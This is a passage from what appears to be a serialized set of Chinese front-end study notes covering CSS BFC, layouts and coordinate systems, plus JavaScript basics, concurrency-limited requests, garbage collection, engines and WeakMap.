**内部的盒子会在垂直方向，一个接一个地放置。**\n2. **盒子垂直方向上的距离由 `margin`** 决定。相邻块级元素的外边距会发生折叠。\n3. **BFC 的区域不会与浮动元素的盒子重叠。**\n4. **BFC 是一个隔离的独立容器，容器内部的元素不会影响外部的元素。**\n\n## 3. 创建 BFC 的方式\n\n以下 CSS 属性会触发创建 BFC：\n\n1. 设置 `float` 不为 `none` 的元素；\n2. 设置 `position` 为 `absolute` 或 `fixed` 的元素；\n3. 设置 `display` 为 `inline-block`, `table-cell`, `table-caption`, `flex`, 或 `grid` 的元素；\n4. 设置 `overflow` 不为 `visible` 的元素。\n\n示例：\n```css\n.bfc {\n  overflow: hidden;  /* 触发 BFC */\n}\n```\n\n## 4. 外边距重叠（Margin Collapsing）\n\n外边距重叠是指`当两个上下相邻的块级元素的垂直外边距相遇时，它们会合并为一个外边距`，其高度为最大的那个外边距值，而不是两者之和。\n\n### 4.1. 兄弟元素的边界重叠 & 父子元素的边界重叠\n\n![A792D720-3B01-4A74-B5BD-7DC9028EFE9D.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/e34a6a6d31a5c93b4d342ec4a57f596b.png)\n\n### 4.2. 外边距重叠的规则\n\n- 同正，较大值 \n- 同负，绝对值最大值\n- 一正一负：相加\n\n## 5. 使用 BFC 防止外边距重叠\n\n- 解决方案：即去触发`BFC`即可，如`BFC` 不会与 `float` 元素发生重叠。\n\n![240B4A71-C78E-47B2-A432-BF18ACC1134C.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/c4f97a2d27026987eb2967c1a6d48207.png)\n\n![E87FF6E8-F4A6-458C-B71C-9D230BAC5BB1.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/ff8df8522e39084cec5d64669309ac23.png)\n\n","FVcKac0j":"\n# CSS 布局都有哪些\n\n\n`#前端/CSS` \n\n- CSS Grid Layout：\n\t- 二维布局系统\n- CSS Flexbox：\n\t- 一维布局模型\n- 多列布局：\n\t- column-count、column-gap 等\n- 浮动布局：\n\t- 不展开了，不建议使用了\n","o8wLmV3P":"\n# CSS 定位或布局相关的参考坐标系\n\n\n`#前端/CSS` \n\n![image.png|656](https://832-1310531898.cos.ap-beijing.myqcloud.com/yuque/c792c133990e2818a06482c7117b141c.png)\n\n> 这里可以对应 JS 获取某个元素的各种位置信息：比如 clientX pageX 、width 、offesetLeft 等等等等\n> \n\n\n## 目录\n<!-- toc -->\n ## 1. **文档坐标系** \n\n文档坐标系是整个 HTML 文档的坐标系，所有位置和尺寸都是相对于文档的起点（通常是**左上角**）来指定的。\n\n- **元素的宽度和高度**：以整个文档为参考系。\n- **滚动位置**：以整个文档为基准的滚动。\n\n> - `块级元素`独占一行,`内联元素`在一行内排列\n\n## 2. **视口坐标系**\n\n视口坐标系是指`浏览器窗口或视口`的坐标系。\n\n- **百分比宽度和高度**：如`width: 100vw`表示宽度为 100% 视口宽度。\n- **固定定位**：`position: fixed;` 会以视口为参考系来定位元素。\n\n## 3. **包含块（Containing Block）**\n\n`包含块`是一个元素在正常流或其他指定布局上下文中的直接父块或祖先块，用于确定其坐标和大小。\n\n- **相对定位**：`position: relative;` 会以包含块为参考来定位元素。\n- **绝对定位**：`position: absolute;` 会以最近的非静态定位的祖先元素（包含块）为参考。\n\n## 4. **边框框（Border Box）**\n\n边框框是包含元素的内容、**内边距和边框**的区域。\n\n- **盒模型**：用于计算元素的总计宽度和高度。\n\n## 5. **内边距框（Padding Box）**\n\n内边距框是包含元素内容和内边距的区域。\n\n- **背景和边框**：默认情况下，`**背景和边框**`会扩展到内边距框之外。\n\n## 6. **内容框（Content Box）**\n\n内容框是仅包含元素内容的区域，不包括内边距、边框和外边距\n\n- **内容尺寸**：通过`box-sizing`属性可以设置为以`内容框或边框框`来计算元素尺寸（默认是`content-box`）。\n\n## 7. **变换参考系（Transform Reference）**\n\n当你对元素应用 CSS 变换（比如`transform`属性）时，使用的是变换参考系\n\n- **变换中心点**：默认情况下，**变换中心点为元素的中心**。\n- 创建一个新的坐标系，不影响其他元素\n- 变换后的元素成为其子元素的`包含块`\n\n```css\n.transform {  \n   transform: rotate(45deg) translateX(100px);  \n}\n```\n\n## 8. 表格布局\n\n- display: `table 和 table-cell`\n- 模拟表格的布局结构\n\n## 9. Flex 布局、 Grid 布局、CSS 多列布局（Multi-Column Layout）\n\n这些布局模型创建了自己的坐标系:\n\n- Flexbox 坐标系: \n\t- 主轴(main axis)和交叉轴(cross axis)\n- Grid 坐标系: \n\t- 行和列定义的`网格坐标系`\n- Multi-Column Layout：\n\t- 用于==将文本分为多列==\n\n## 10. 示例\n\n下面示例展示了几种不同的坐标系的使用：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>CSS Reference Coordinate Systems</title>\n\n    <style>\n        .relative-container {\n            position: relative;\n            width: 300px;\n            height: 300px;\n            background-color: lightgray;\n            margin: 50px; /* 文档坐标系 */\n        }\n\n        .relative-child {\n            position: absolute;\n            top: 10px; /* 包含块参考系 */\n            left: 10px;\n            width: 100px;\n            height: 100px;\n            background-color: lightcoral;\n        }\n\n        .fixed-element {\n            position: fixed;\n            top: 20px; /* 视口坐标系 */\n            right: 20px;\n            width: 100px;\n            height: 100px;\n            background-color: lightblue;\n        }\n\n        .transform-element {\n            width: 100px;\n            height: 100px;\n            background-color: lightgreen;\n            margin: 50px;\n            transform: rotate(45deg); /* 变换参考系 */\n        }\n    </style>\n\n</head>\n\n<body>\n    <div class=\"fixed-element\">Fixed</div>\n\n    <div class=\"relative-container\">\n        <div class=\"relative-child\">Absolute</div>\n\n    </div>\n\n    <div class=\"transform-element\">Transform</div>\n\n</body>\n\n</html>\n\n```\n\n## 11. 关键点\n\n1. **文档坐标系**：用于整体文档的布局和滚动。\n2. **视口坐标系**：用于固定定位和视口相对尺寸。\n3. **包含块**：用于`相对和绝对`定位。\n4. **边框框、内边距框和内容框**：用于`盒模型`计算。\n5. **变换参考系**：用于应用 CSS 变换。\n\n\n","MApTMxad":"\n# JavaScript 篇\n\n`#javascript` \n\n- JavaScript 相关的知识点\n- 宿主环境 API\n\t- **浏览器宿主环境**相关的知识点见`浏览器篇`，比如\n\t\t- DOM、BOM 相关的等\n\t- Nodejs 环境见 Nodejs 篇\n\t\t- [0. 前言](/post/hN6h8nAB.html)\n\n","4F89TUCd":"\n# JavaScript 简介\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. JavaScript 的基本概念 \n\n### 1.1. 定义\n\n- **JavaScript** 是一种符合 ECMAScript 规范的高级编程语言。\n- 最初设计的目的是增强 HTML 网页的动态行为和交互能力。\n\n### 1.2. 历史\n\n- **诞生**：\n\t- 由 Brendan Eich 在 1995 年开发，并首次应用于 Netscape Navigator 浏览器。\n- **标准化**：\n\t- ECMAScript 是由 ECMA International 管理的 JavaScript 标准化规范，ECMAScript 31999 年）和 ECMAScript 5（2009 年）是重要的里程碑。\n- **现代化**：\n\t- ECMAScript 6（2015 年），又称 ==ES6 或 ES2015==\n\t\t- 引入了许多新特性类，模块，箭头函数等。\n\n## 2. JavaScript 的核心特性\n\n### 2.1. 动态类型\n\n- JavaScript 是动态类型语言，变量可以在运行时改变类型。\n\n### 2.2. 解释执行\n\n- JavaScript 解释型语言，==不需要编译==，直接在浏览器或 JS 引擎中解释执行。\n\t- 或者说是 即时编译（JIT）\n\n### 2.3. 弱类型\n\n- 支持隐式类型转换，可以灵活使用不同的数据类型\n\n### 2.4. 单线程\n\n- JavaScript 本上是单线程的，但通过==事件循环机制==可以处理异步任务\n\n### 2.5. 跨平台\n\n- JavaScript 可以在多种环境下运行，最常见的是浏览器环境和 Node.js 环境。\n- 特别容易集成\n\t- 比如很多低代码平台内置 js 引擎方便扩展\n\t- 又比如 postman，自动化脚本等等也内置了 js 引擎\n\n## 3. JavaScript 的应用场景\n\n### 3.1. Web前端开发\n\n- **DOM操作**：\n\t- 控制和操作网页内容\n- **事件处理**：\n\t- 响应用户操作（如点击、输入）\n- **AJAX**：\n\t- 实现异步数据请求和更新\n- **动态样式**：\n\t- 通过操作 CSS 打造动态效果\n\n### 3.2. 服务端开发\n\n- **Node.js**：基于 Chrome V8 引擎构建，支持服务器端开发。\n- **Express、Koa**：常用的服务器框。\n- **数据库操作**：\n\t- 如与 MongoDB、MySQL 的交互。\n\t- ORM\n\n### 3.3. 全栈开发\n\n- **MEAN/MERN 栈**：\n\t- MongoDB, Express, Angular/React, Node.js。\n\t\t- ==很早以前还用过==\n- 基于 React 和 Vue.js 的服务端渲染框架: \n\t- Next.js 和 Nuxt.js。\n\n### 3.4. 移动应用开发\n\n- **React Native**：\n\t- 使用 JavaScript 构建原生移动应用。\n- **Ionic、PhoneGap/Cordova**：\n\t- 建跨平台移动应用。\n\n### 3.5. 桌面应用开发\n\n- **Electron、NW.js**：\n\t- 使用 Web 技术构建跨平台桌面应用。\n\n### 3.6. 游戏开发\n\n- **Three.js**：创建3D图形动画。\n- **Phaser**：2D 游戏框架。\n\n### 3.7. 数据可视化\n\n- **D3.js、Chart.js、Highcharts**：用于高级数据可视化和图表创建。\n\n### 3.8. 机器学习人工智能\n\n- **TensorFlow.js、Brain.js**：让机器学习和神经网络在浏览器中运行。\n- MD5.js\n\n### 3.9. 物联网 (IoT)\n\n- **Johnny-Five、Espruino**：用于智能设备和嵌式开发。\n\n### 3.10. 自动化和脚本\n\n- **Gulp、Grunt**：任务自动化工具。\n- **ShellJS**：执行系统命令和脚本编写。\n\n## 4. JavaScript 的重要概念和机制\n\n### 4.1. 原型和原型链\n\n- JavaScript 使用原型继承，即对象之间通过原型链形成继承关系。\n\n### 4.2. 闭包\n\n- 闭包是一个函数能记住并访问它的词法域，即使在函数在其词法作用域外执行。\n\n### 4.3. 事件循环\n\n- 事件循环是 JavaScript 处理异步操作的机制，检测**调用栈**是否为空，并从==任务队列中取任务执行==\n\n### 4.4. 异步编程\n\n- **回调函数**：\n\t- 基本的异步处理方式，但会导致“回调地狱”。\n- **Promise**：\n\t- 链式解决异步调用，避免回调地狱。\n- **async/await**：\n\t- Promise 的语法糖，让异步代码看起来像同步代码。\n\n### 4.5. this 关键字\n\n- `this` 在==不同的上下文中有不同的指向==。比如，\n\t- 函数调用中的 `this` 指向局对象\n\t- 用 `new` 调用构造函数时，`this` 指向新创建的对象。\n\n### 4.6. 模块化\n\n- ES6 提供了原生的模块化支持 (`import` 和 `export`)。\n- 之前解决方案包括 `CommonJS` (Node.js 使用的模块系统) 和 AMD (异步模块定义)。\n\n## 5. JavaScript 的生态系统\n\n- **库和框架**：\n\t- 如 React、Vue.js、Angular、jQuery 等。\n- **包管理**：\n\t- npm (Node Package Manager)、Yarn 等。\n\t- pnpm\n- **构建工具**：\n\t- Webpack、Parcel、Gulp、Grunt 等。\n\t- rspack \n- **测试工具**：\n\t- Jest、Mocha、Chai、Cypress 等。\n- **版本控制：Babel，支持将新的 JavaScript 语法转换为旧的语法，以便在不支持的环境中运行。\n\n## 6. JavaScript 的局限性\n\n- 单线程模型在进行 ==CPU 密集型==任务时效率较低。\n- **隐式类型转换**可能导致一些预期之外的行为。\n- ==动态类型==系统可能在大型项目中引入类型相关的缺陷。\n\n","Qr2fzyd9":"\n# 实现批量请求并支持控制最大并发数\n\n`#前端` \n\n\n## 目录\n<!-- toc -->\n ## 1. 最简易实现：promise + finally \n\n- 请求队列\n- 支持批量请求\n- 支持取消\n\n```javascript hl:22,19,26\nfunction request(url) {\n    return new Promise((resolve) => {\n        setTimeout(() => resolve(url), 1000);\n    });\n}\n\n/**\n * @desc\n * @param urls 请求的URL数组\n * @param maxNum 并发数\n * */\nfunction multiRequest(urls = [], maxNum) {\n    const total = urls.length\n    const result = new Array(total).fill(false);\n    let count = 0 // 进行到第几个\n    let cancel = null;\n    let promise = new Promise((resolve, reject) => {\n        // 关键，如何调用cancel直接取消\n        cancel = () => reject('cancel');\n        // 注意，这是第一次，连续添加5个并发数，然后就是 结束一个添加一个\n        // 第一次，添加最大并发数目，再之后，每次finally后就添加一个，就能够保证一直是5个并发数\n        while (count < maxNum) {\n            // 首次就添加 5次\n            next()\n        }\n        // 下一个请求\n        function next() {\n            const current = count++\n            // ::::如果当前的请求已经大于 total了，那么就直接resolve结果\n            if (current >= total) {\n                !result.includes(false) && resolve(result)\n                return\n            }\n            // 否则，一直请求，使用fanally\n            // 或者直接使用原生fetch函数\n            request(urls[current]).finally((res) => {\n                result[current] = res\n                if (current < total) {\n                    // 这里有个递归\n                    // 完了就添加一次\n                    next()\n                }\n            })\n        }\n    })\n    // ::::返回，方便外面可取消\n    return {promise, cancel}\n}\n\nlet urls = []\nfor (let i = 0; i < 20; i++) {\n    urls.push(`https://api.github.com/search/users?q=${i}`)\n}\nlet q = multiRequest(urls, 5);\n\n// 可直接调用取消发请求\nq.cancel()\n```\n\n## 2. 另外一种思路：`Promise.all()`和`Promise.race()`结合循环来实现\n\n### 2.1. 先使用 setimeout 模拟请求\n\n```javascript\n/**\n * 模拟异步请求\n * @param {*} id 标识符\n * @param {*} delay 延迟时间\n */\nconst mockRequest = (id, delay) => {\n    return new Promise(resolve => {\n        setTimeout(() => {\n            console.log(`完成请求 ${id}`);\n            resolve(`响应 ${id}`);\n        }, delay);\n    });\n};\n```\n\n### 2.2. 主要逻辑\n\n**关键点：**\n\n- 使用 `set` 来存储任务集合\n- 使用 `next` 来标识处理每一个请求逻辑，这里是**主要逻辑**\n   - 每次执行完成需要从集合中 `delete` 掉\n      - 失败也需要从集合中 `delete` 掉\n   - 判断是否达到最大并发数\n      - 达到，等待任意请求完成\n         - 使用 `Promise.race` 来竞赛，完成后 `then` 继续执行 `next`\n      - 没达到\n         - 直接启动下个任务 `next()`\n\n```javascript\n/**\n * 批量执行请求，控制最大并发数\n * @param {Array} tasks 任务数组\n * @param {number} maxConcurrency 最大并发数\n */\nasync function runBatchRequests(tasks, maxConcurrency) {\n    let i = 0; // 当前处理的任务索引\n    const total = tasks.length;\n    const executing = new Set(); // 正在执行的任务集合\n\n    // 下一个任务 , 递归调用\n    const next = () => {\n        // 所有任务已经启动\n        if (i === total) {\n            return Promise.resolve();\n        }\n        const task = tasks[i++](); // 获取任务并执行\n        executing.add(task);\n\n        const clean = () => executing.delete(task);\n        task.then(clean).catch(clean);\n\n        let p = Promise.resolve();\n\n        if (executing.size >= maxConcurrency) {\n            // 达到最大并发数，等待任意任务完成\n            p = Promise.race(executing).then(() => next());\n        } else {\n            // 未达到最大并发数，直接启动下一个任务\n            p = next();\n        }\n        return p;\n    };\n\n    await next().then(() => Promise.all(executing)); // 确保所有任务都完成了\n}\n```\n\n### 2.3. 测试\n\n```javascript\n// 示例使用\nconst awaitList = [1000, 500, 1000, 300, 800, 700, 900];\nconst tasks = awaitList.map((item, index) => () => mockRequest(index + 1, item));\n\nrunBatchRequests(tasks, 10).then(() => console.log('所有请求完成'));\n\n```\n\n### 2.4. 总结\n\n- `runBatchRequests` 函数接受一个任务数组和最大并发数作为参数。每个任务都是一个返回Promise的函数。\n   - 函数内部，通过**递归调用** `next 函数` 来不断地启动新的任务，直到所有任务都被处理。\n   - 通过维护一个`executing集合`来跟踪当前正在执行的任务，并使用`Promise.race()`在达到最大并发限制时等待至少一个任务完成。这样可以在任何任务完成后立即启动新的任务，从而维持最大并发数，直到所有任务都完成。\n\n","epfFihvu":"\n# JavaScript 的垃圾回收机制\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. 垃圾回收机制：一般就两种 \n\n- `标记清理`\n\t- **离开作用域的值** 会被自动标记为可回收，然后在**垃圾回收期间**被删除\n\t\t- 下面会展开\n- `引用计数`是另一种垃圾回收策略，需要记录值被引用了多少次\n\t- ==循环引用场景会出问题==\n\n## 2. 标记-清除：==两个阶段==\n\n最常用的垃圾回收算法是 **标记-清除 (Mark-and-Sweep)**。以下是主要特点和步骤\n1. **标记阶段 (Marking Phase)**:\n\t- 从根对象（例如全局对象、局部变量等）开始，标记所有可达的对象，即有引用的对象\n2. **清除阶段 (Sweeping Phase)**:\n\t- 遍历内存，将未被标记的对象视为垃圾，并将其内存释放\n\n## 3. 其他优化策略\n\n1. **分代垃圾回收 (Generational Garbage Collection)**:\n\t- 将内存分为两代：\n\t\t- ==新生代和老生代==\n\t- 新生代对象生命周期==短==，频繁回收\n\t- 老生代对象生命周期==长==，较少回收\n2. **增量垃圾回收 (Incremental Garbage Collection)**:\n\t- 将标记和清除过程分成多个小步进行，以避免长时间停顿\n3. **惰性垃圾回收 (Lazy Garbage Collection)**:\n\t- 当**系统空闲时**才进行垃圾回收，减少对应用程序性能的影响。\n\n### 3.1. 垃圾回收触发条件\n\n- 内存使用达到**一定阈值**。\n- **系统空闲时**主动触发垃圾回收。\n\n### 3.2. 优点\n\n- **自动内存管理**：\n\t- 开发者无需手动管理内存，减少内存泄漏风险。\n- **优化性能**：\n\t- 现代垃圾回收机制通过多种优化策略，降低了对应用性能的影响。\n\n### 3.3. 缺点\n\n- **不可控性**：\n\t- 垃圾回收时机和频率由引擎管理，==开发者无法完全控制==。\n- **潜在的性能影响**：\n\t- 尽管有多种优化策略，但垃圾回收仍可能在高负载应用中引入停顿\n\n\n## 4. 是否有什么办法能够主动触发垃圾回收？\n\n**在常规 JavaScript 中，不能直接、可靠地触发垃圾回收（Garbage Collection，GC）**，\n- 因为这是由 JavaScript 引擎自动管理的\n- 不过也有一些特定环境或者间接的方法触发\n\n### 4.1. 开发环境下的调试方法\n\n```javascript hl:1,10\n// Chrome DevTools\n// 1. 打开开发者工具\n// 2. 打开 Memory 面板\n// 3. 点击垃圾桶图标 \"Collect garbage\"\n\n// Node.js 环境\nif (global.gc) {\n    global.gc();\n}\n// 需要使用 --expose-gc 参数启动 Node.js\n// node --expose-gc script.js\n```\n\n### 4.2. 间接触发 GC 的常见做法\n\n```javascript hl:6\n// 1. 解除引用\nlet obj = { data: \"some data\" };\nobj = null;  // 解除引用，使对象可被回收\n\n// 2. 使用 WeakRef 和 WeakMap\nlet weakRef = new WeakRef(obj);\nobj = null;  // 原对象可能被回收\n\n// 3. 闭包内的变量\nfunction createClosure() {\n    let largeData = new Array(1000000);\n    return function() {\n        // largeData 在这里被引用\n    };\n}\nlet closure = createClosure();\nclosure = null; // 清除闭包引用\n```\n\n### 4.3. 内存监控方法\n\n```javascript hl:9\n// 1. Node.js 环境\nconst used = process.memoryUsage();\nconsole.log({\n    heapTotal: `${Math.round(used.heapTotal / 1024 / 1024 * 100) / 100} MB`,\n    heapUsed: `${Math.round(used.heapUsed / 1024 / 1024 * 100) / 100} MB`\n});\n\n// 2. 浏览器环境\nconsole.log(performance.memory); // Chrome only\n```\n\n### 4.4. 开发建议\n\n- 避免全局变量\n- 及时清除事件监听器\n- 及时清除定时器\n- 避免循环引用\n- 使用适当的数据结构（WeakMap、WeakSet 等）\n- 分批处理大量数据\n- 注意闭包的使用\n\n```javascript\n// 错误示例\nwindow.globalData = { /* 大量数据 */ };\n\n// 正确示例\nfunction processData() {\n    const data = { /* 大量数据 */ };\n    // 处理数据\n    // 函数结束后 data 可被回收\n}\n```\n\n### 4.5. 调试工具\n\n- Chrome DevTools 的 `Memory` 面板\n- Node.js 的 `--inspect` 调试模式\n- 内存泄漏检测工具（如 `heapdump`）\n\nJavaScript 的`垃圾回收机制`主要通过`自动内存管理`来处理不再使用的对象和变量，以释放内存资源。\n\n","v2NdaNQX":"\n# JavaScript 引擎\n\n`#javascript` \n\n\n## 目录\n<!-- toc -->\n ## 1. 主要的 JavaScript 引擎包括 \n\n1. **V8 (谷歌)**:\n\t- 开发者：谷歌\n\t- 用于：Chrome 浏览器、Node.js 等\n\t- 特色：\n\t\t- 使用`即时编译`（JIT，Just-In-Time compilation），\n\t\t\t- 将 JavaScript 代码即时编译成与**机器码**，以提高执行效率。\n2. **SpiderMonkey (Mozilla)**:\n\t- 开发者：Mozilla\n\t- 用于：Firefox 浏览器\n\t- 特色：\n\t\t- 是第一个 JavaScript 引擎，支持`解释和编译`两种模式，使用多层优化编译器。\n3. **Chakra (微软)**:\n\t- 开发者：微软\n\t- 用于：曾用于 Internet Explorer 和 Microsoft Edge (旧版，EdgeHTML)\n\t- 特色：拥有一个强大的 JIT 编译器，支持优化的执行和垃圾回收\n\t\t- 转向 webkit，反映了微软的务实态度，通过采用主流的开源解决方案，他们可以提供更好的用户体验，**同时将资源集中在差异化功能的开发上**\n4. **JavaScriptCore (苹果)**:\n\t- 开发者：苹果\n\t- 用于：Safari 浏览器\n\t- 特色：\n\t\t- 也被称为 `Nitro`，注重内存管理和执行性能\n\n## 2. 工作原理与组成部分\n\n引擎很复杂，但是基本原理很简单\n\n1. 引擎（如果是浏览器，则引擎被嵌入在其中）读取（“解析”）脚本。\n2. 然后，引擎将脚本转化（“编译”）为机器语言。\n3. 然后，机器代码快速地执行\n\n1. **解析和编译**\n\t- 代码首先被解析器解析为 AST，\n\t- 然后 JIT 编译器将部分 AST 编译成机器码。\n\t- 当运行过程中发现某些代码片段被==频繁调用==，编译器会进一步优化这些片段。\n2. **执行**\n\t- 执行引擎会根据编译后的代码直接运行机器码，从而提高性能\n3. **垃圾回收 (Garbage Collection)**\n\t- JavaScript 引擎会自动管理内存，自动回收不再使用的对象和变量\n\t- 这通常是通过垃圾回收器实现的，\n\t\t- 常见的算法包括：\n\t\t\t- 标记-清除 (mark-and-sweep)\n\t\t\t- 引用计数 (reference counting) 等。\n\n**JavaScript 引擎的组成部分**\n1. **解析器 (Parser)**:\n\t- 将源代码转换成抽象语法树 (AST，Abstract Syntax Tree)。\n\t- 分析代码结构，保证语法正确。\n2. **解释器 (Interpreter)**:\n\t- 逐行解释和执行 JavaScript 代码，使用 AST 生成中间代码。\n3. **编译器 (Compiler)**:\n\t- JIT 编译器会在运行时将`频繁执行的代码`编译成机器码，以更快地执行。\n4. **运行时 (Runtime)**:\n\t- 提供内置函数、内存管理（如垃圾回收）和执行环境。\n\n```javascript hl:1\n// 源代码 -> 解析 -> AST -> 字节码 -> 机器码\nconst code = `\n    function add(a, b) {\n        return a + b;\n    }\n    add(1, 2);\n`;\n\n// 1. 解析阶段\n// 2. 生成 AST\n// 3. 生成字节码\n// 4. JIT 编译为机器码\n```\n\n引擎处理过程：\n\n```css\n源代码 \n  ↓\n词法分析器 (Lexer)\n  ↓ [将代码分解为 tokens]\n语法分析器 (Parser)\n  ↓ [生成 AST]\n解释器 (Interpreter)\n  ↓ [生成字节码]\n编译器 (Compiler)\n  ↓ [生成机器码]\n优化编译器\n```\n\n> 源码 → token → ast → 字节码 → 机器码\n\n### 2.1. 词法分析（Lexical Analysis）\n\n```javascript\n// 词法分析（Lexical Analysis）\n// 将源代码分解成 tokens\nlet x = 42;\n// 转换为 tokens：\n// [\n//   { type: 'keyword', value: 'let' },\n//   { type: 'identifier', value: 'x' },\n//   { type: 'operator', value: '=' },\n//   { type: 'number', value: '42' },\n//   { type: 'punctuator', value: ';' }\n// ]\n\n// 语法分析（Syntactic Analysis）\n// 构建 AST（抽象语法树）\n\n```\n\n### 2.2. 字节码生成：编译\n\n```javascript\n// 字节码生成\nfunction example() {\n    let x = 1;\n    return x + 2;\n}\n\n// 可能的字节码表示（伪代码）\n/*\nLOAD_CONST 1\nSTORE_FAST 'x'\nLOAD_FAST 'x'\nLOAD_CONST 2\nBINARY_ADD\nRETURN_VALUE\n*/\n\n```\n\n## 3. **优化机制**\n\n- **即时编译 (Just-In-Time Compilation, JIT)**\n\t- 使用 JIT 编译器，代码在运行时被动态编译，避免了解释代码的开销\n- **内联缓存 (Inline Caching)**\n\t- 用于加速属性查找和方法调用频繁的对象\n\t- 下面有介绍\n- **惰性解析 (Lazy Parsing)**\n\t- 只在真正需要时解析 JavaScript 代码，提高初始加载性能\n- **垃圾回收优化**\n\t- 通过分代垃圾回收、增量垃圾回收等技术，提高内存管理效率\n- **热点代码优化**：**频繁执行的代码**会被优化\n\t- 比如 for 循环里面的代码\n- **去优化**：\n\t- 当假设不再成立时，会回退优化\n\n==其实很多思路类似==，\n- 比如，**缓存，避免重复搞第二遍**； \n- 比如，**内存，特定时机就得回收，别等到最后**  \n- 比如，**惰性解析**，真正需要执行的时候再执行\n- 比如，`懒加载，预加载`等等思路\n\t- 其实`在 JavaScript 引擎`都有体现\n\n### 3.1. **JIT（即时编译）**\n\n```javascript\n// 热点代码示例\nfunction hotFunction() {\n    // 被频繁调用的代码\n    for(let i = 0; i < 1000000; i++) {\n        // 执行操作\n    }\n}\n```\n\n### 3.2. **内联缓存 (Inline Caching)** → 缓存\n\n```javascript\nfunction getProperty(obj, prop) {\n    return obj[prop];  // 引擎会缓存属性访问路径\n}\n```\n\n### 3.3. **隐藏类 (Hidden Classes)**\n\n```javascript\n// 推荐写法\nfunction Point(x, y) {\n    this.x = x;\n    this.y = y;\n}\n\n// 不推荐写法（会创建多个隐藏类）\nlet point = {};\npoint.x = 1;\npoint.y = 2;\n```\n\n## 4. **内存管理**\n\n### 4.1. **堆内存**\n\n```javascript\n// 对象存储在堆内存中\nconst obj = {\n    largeData: new Array(1000000)\n};\n```\n\n### 4.2. **栈内存**\n\n```javascript\n// 基本类型和引用存储在栈内存中\nlet number = 42;\nlet string = \"hello\";\n```\n\n### 4.3. **垃圾回收**\n\n```javascript\nlet obj = {\n    name: 'test'\n};\nobj = null; // 标记为可回收\n```\n\n## 5. 优化技巧：写代码时的注意事项\n\n### 5.1. **避免动态属性**\n\n```javascript\n// 好的做法\nfunction createObject(value) {\n    const obj = {\n        property: value\n    };\n    return obj;\n}\n\n// 避免这样做\nfunction createObject(value) {\n    const obj = {};\n    obj.property = value;\n    return obj;\n}\n```\n\n>  不然 JavaScript 引擎不太好优化\n\n### 5.2. **使用类型一致的代码**\n\n```javascript\n// 好的做法\nfunction add(a, b) {\n    // 总是传入数字类型\n    return a + b;\n}\n\n// 避免这样做\nfunction add(a, b) {\n    // 参数类型不确定\n    if (typeof a === 'string') {\n        return a + String(b);\n    }\n    return a + b;\n}\n```\n\n>  不然 JavaScript 引擎不太好优化\n\n### 5.3. 使用数组时预分配空间\n\n```javascript hl:9\n// 2. 使用数组时预分配空间\nconst arr = new Array(1000); // 好的做法\nconst arr = []; // 动态增长，可能导致多次重新分配\n\n// 3. 避免稀疏数组\nconst arr = [1, 2, 3]; // 好的做法\nconst arr = [];\narr[0] = 1;\narr[1000] = 2; // 避免这样做\n\n```\n\n>  不然 JavaScript 引擎不太好优化\n\n## 6. **性能监控**\n\n```javascript\n// 使用 Performance API\nconsole.time('operation');\n// 执行操作\nconsole.timeEnd('operation');\n\n// 内存使用情况\nconsole.memory;\n```\n\n## 7. **最新发展**\n\n- WebAssembly 集成\n- 新的语言特性支持\n- 性能优化改进\n- 内存管理优化\n\n## 8. **调试和工具**\n\n```javascript hl:6\n// 使用 Chrome DevTools\n// 设置断点\ndebugger;\n\n// 性能分析\nconsole.profile('MyProfile');\n// ... 代码 ...\nconsole.profileEnd('MyProfile');\n\n// 内存快照\nconsole.memory;\n```\n\n### 8.1. 新的性能 API 和调试工具\n\n```javascript hl:8\n// 1. 性能监控 API\nperformance.mark('start');\n// 执行代码\nperformance.mark('end');\nperformance.measure('操作耗时', 'start', 'end');\n\n// 2. 内存泄漏检测\nconst tracker = new PerformanceObserver((list) => {\n    const entries = list.getEntries();\n    // 分析内存使用模式\n});\n\n// 3. 新的调试功能\nconsole.profile('DetailedProfile');\n// 代码执行\nconsole.profileEnd('DetailedProfile');\n\n```\n\n>  PerformanceObserver 观察者模式监控性能\n\n## 9. 参考\n\n- [https://zh.javascript.info/intro](https://zh.javascript.info/intro)\n- [https://kangax.github.io/compat-table](https://kangax.github.io/compat-table) ：\n\t- 一份列有语言功能以及引擎是否支持这些功能的表格。\n","89ATpGaD":"\n# JavaScript 对象\n\n`#JavaScript` \n\n\n## 目录\n<!-- toc -->\n ## 1. Map、WeakMap的区别 \n\n- 键值不同\n\t- `Map` 对象的键**可以是任何类型** ，是**强引用**\n\t- 但 `WeakMap` 对象中的键**只能是对象引用**，是`弱引用`\n- 垃圾回收：weakMap 可以==自动回收==\n\n- `WeakMap`只接受`对象`作为键名（`null`除外），不接受其他类型的值作为键名\n\t1. 键名必须是对象（object）\n\t2. 对键名是弱引用（这也是为什么叫 WeakMap）\n\t3. ==不接受原始数据类型==作为键名，包括：\n\t    - ==null==\n\t    - undefined\n\t    - 数字\n\t    - 字符串\n\t    - 布尔值\n\t    - Symbol\n- 其次，`WeakMap`的键名所指向的对象，不计入垃圾回收机制，所以\n\t- `WeakMap`的专用场合就是，它的键所对应的对象，可能会在将来消失。\n\t- WeakMap 结构有助于**防止内存泄漏**\n- set 方法返回的是当前的 Map对象，因此可以采用**链式写法** \n\t- `0` 和 `-0` 就是**同一个键**\n\t- 虽然`NaN`不严格相等于自身，但 Map 将其视为**同一个键**\n\n```javascript hl:1,8\n// WeakMap 弱引用的只是键名，而不是键值。键值依然是正常引用。\n\nconst wm = new WeakMap();\nlet key = {};\nlet obj = {foo: 1};\n\nwm.set(key, obj);\nobj = null;\nwm.get(key)\n// Object {foo: 1}\n// 上面代码中，键值obj是正常引用。所以，即使在 WeakMap 外部消除了obj的引用，WeakMap 内部的引用依然存在。\n```\n\n> chrome 中 Memory 面板，有一个垃圾桶的按钮，可以**强制垃圾回收（garbage collect）**。这个按钮也能用来观察 WeakMap 里面的引用是否消失\n\n## 2. FinalizationRegistry 与 WeakRef\n\n```javascript hl:2,5\n// ES2021 引入了清理器注册表功能 FinalizationRegistry，用来指定目标对象被垃圾回收机制清除以后，所要执行的回调函数。\nconst registry = new FinalizationRegistry(heldValue => {\n  // ....\n});\n// ES2021支持 